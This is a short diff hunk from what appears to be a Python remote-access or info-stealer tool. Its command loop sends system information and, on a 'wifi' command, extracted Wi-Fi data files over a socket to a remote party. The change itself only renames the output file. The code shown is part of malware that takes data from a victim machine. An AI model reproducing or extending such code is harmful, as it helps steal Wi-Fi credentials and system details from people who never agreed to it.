@@ -541,7 +541,7 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                     send_data(get_system_info())
 
                 elif cmd == "wifi":
-                    output_path = os.path.join(EXTRACT_FOLDER, "wifi_remote.txt")
+                    output_path = os.path.join(EXTRACT_FOLDER, "wifi.txt")
                     extract_wifi()
                     with open(output_path, "rb") as f:
                         s.sendall(b"STARTFILE\n")
